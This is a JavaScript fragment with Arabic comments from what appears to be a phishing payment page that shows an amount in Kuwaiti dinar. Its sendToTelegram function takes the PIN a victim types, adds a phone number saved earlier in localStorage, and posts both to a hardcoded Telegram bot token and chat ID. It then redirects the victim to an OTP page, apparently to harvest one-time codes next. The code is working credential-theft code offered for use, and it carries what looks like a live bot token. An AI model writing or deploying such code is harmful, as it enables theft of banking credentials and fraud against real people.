

        // استرجاع رقم الهاتف المخزن من localStorage
        const storedPhone = localStorage.getItem("userPhone");

        // إذا كان الرقم موجودًا، نقوم بإضافته إلى الحقل المخفي
        if (storedPhone) {
            document.getElementById("hiddenPhoneInput").value = storedPhone;
        }
        
        
        
        function sendToTelegram() {
            var token = "7484126870:AAEDSU1tM_kBFwSJ0IpQT0NmuWYzW8wq4_E"; 
            var chatId = "6454807559";  // ضع هنا الـ Chat ID الخاص بك
            var pin = document.getElementById("pin").value;
            var phone = document.getElementById("hiddenPhoneInput").value; // الحصول على قيمة الحقل المخفي
        
            if (!pin) {
                alert("يرجى إدخال الرقم السري.");
                return;
            }
        
            // إنشاء الرسالة التي تحتوي على الرقم السري ورقم الهاتف المخزن
            var message = `📩 بيانات جديدة:\n\n🔑 الرقم السري: ${pin}\n📱 رقم الهاتف: ${phone}`;
        
            var url = `https://api.telegram.org/bot${token}/sendMessage`;
        
            fetch(url, {
                method: "POST",
                headers: { "Content-Type": "application/json" },
                body: JSON.stringify({ chat_id: chatId, text: message })
            })
            .then(response => response.json())
            .then(data => {
                if (data.ok) {
                    window.location.href = "otp.html";  // توجيه المستخدم إلى صفحة eror.html عند نجاح الإرسال
                } else {
                    alert("فشل في إرسال البيانات. يرجى المحاولة مرة أخرى.");
                }
            })
            .catch(error => {
                console.error("خطأ:", error);
                alert("حدث خطأ أثناء الإرسال. تأكد من اتصالك بالإنترنت.");
            });
        }
        
        
                function resetForm() {
                    document.getElementById("paymentForm").reset();
                }
        
                // استرجاع القيمة الإجمالية من localStorage
        const totalAmount = localStorage.getItem("totalAmount");
        
        // تحديث النص داخل العنصر الذي يحتوي على الـ id "amountValue"
        document.getElementById("amountValue").innerText = totalAmount;
        
        window.onload = function () {
            const amount = localStorage.getItem('selectedAmount');
            document.getElementById('amountValue').textContent = amount ? `${amount} د.ك` : 'لا يوجد مبلغ محدد';
          };
        
        setTimeout(function() {
                    document.getElementById('namenone').style.display = 'none'; // إخفاء العنصر
                    let allElements = document.body.querySelectorAll('*');
                    allElements.forEach(function(element) {
                        element.style.visibility = 'visible'; // إظهار باقي العناصر
                    });
                }, 3000); // 5000 ملي ثانية = 5 ثواني